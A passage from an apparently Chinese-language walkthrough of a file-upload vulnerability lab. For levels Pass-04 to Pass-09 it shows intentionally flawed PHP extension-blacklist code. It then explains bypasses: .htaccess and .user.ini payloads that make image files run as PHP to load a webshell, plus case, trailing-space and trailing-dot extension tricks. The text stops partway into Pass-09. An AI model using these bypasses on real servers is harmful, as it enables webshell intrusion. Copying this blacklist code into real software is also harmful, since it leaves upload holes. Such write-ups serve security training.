        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".php1"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".pHp1"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".ini"</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">'.'</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span>

        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) {
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) {
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'此文件不允许上传!'</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    }
}</code></pre>
<p>这里可以看到黑名单过滤的更多了，能过滤的几乎都过滤了，但却没有过滤.htaccess与.user.ini后缀</p>
<p>而这里用到的是.htaccess：</p>
<pre><code class="hljs plaintext">htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</code></pre>
<p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p>
<p>它里面有这样一段代码：AllowOverride None，我们把None改成All</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202132408872.png" alt="image-20240202132408872"></p>
<p>.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
<p>首先写一个.htaccess，内容如下，他会将后缀名为jpg的文件当作php文件解析，于是我们将木马文件后缀名改为jpg即可</p>
<pre><code class="hljs php">&lt;FilesMatch <span class="hljs-string">"jpg"</span>&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
    
或
    
AddType    application/x-httpd-php    .jpg</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202132822335.png" alt="image-20240202132822335"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202133059800.png" alt="image-20240202133059800"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202133044534.png" alt="image-20240202133044534"></p>
<p>上传成功</p>
<h2 id="pass-05">Pass-05</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) {
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">'.'</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) {
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) {
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    }
}</code></pre>
<p>可以看到过滤了.htaccess，但我们可以利用.user.ini后缀：</p>
<pre><code class="hljs plaintext">php.ini 是 php的配置文件，.user.ini 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。但是想要引发 .user.ini 解析漏洞需要三个前提条件</code></pre>
<ul>
<li>服务器脚本语言为PHP 已满足</li>
<li>服务器使用CGI／FastCGI模式</li>
<li>上传目录下要有可执行的php文件 已满足</li>
</ul>
<p><strong>首先调整为 FastCGI 模式（切换版本中切换到5.3.29-nts+Nginx）</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202133632539.png" alt="image-20240202133632539"></p>
<p>创建一个.user.ini文件</p>
<pre><code class="hljs plaintext">auto_prepend_file=1.jpg</code></pre>
<p>.user.ini文件里的意思是：所有的php文件都自动包含1.jpg文件。.user.ini相当于一个用户自定义的php.ini<br>
首先上传.user.ini</p>
<pre><code class="hljs plaintext">auto_prepend_file=1.jpg</code></pre>
<p>.user.ini文件里的意思是：所有的php文件都自动包含1.jpg文件。.user.ini相当于一个用户自定义的php.ini<br>
首先上传.user.ini，在上传1.jpg会发现解析图片错误，是因为只有在访问 php 文件时，才会自动包含 shell.jpg ，所以作者给了提示在上传目录下是有一个 readme.php 文件的，所以直接访问此文件就可以包含上传的 shell 了</p>
<p>因为php会自动包含1.jpg，那么文件里面的内容就会被当做php代码而执行。我们只需要在包含的文件写上一句话木马即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202133915854.png" alt="image-20240202133915854"></p>
<p>接下来如果直接上传shell.bcx之后，如果你想直接访问该文件会报错，这是因为只有在访问PHP文件的时候，才会自动包含shell.bcx，根据提示，我们知道上传目录下存在redeme.php文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202134157777.png" alt="image-20240202134157777"></p>
<p>上传木马后，我们进入上传目录访问redeme.php文件即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202134913092.png" alt="image-20240202134913092"></p>
<p>上传成功</p>
<h2 id="pass-06">Pass-06</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) {
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">'.'</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>

        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) {
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) {
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    }
}</code></pre>
<p>这里看到又过滤了.ini后缀，但这里却忘记过滤大小写了，修改后缀名为Php即可</p>
<h2 id="pass-07">Pass-07</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) {
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>];
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">'.'</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) {
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) {
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'此文件不允许上传'</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    }
}</code></pre>
<p>与上一关对比发现，没有过滤空格，我们在php后缀添加空格即可绕过</p>
<h2 id="pass-08">Pass-08</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) {
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">'.'</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) {
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) {
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    }
}</code></pre>
<p>对比发现这里没有删除文件末尾的点，我们在php后面添加.即可</p>
<h2 id="pass-09">Pass-09</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) {
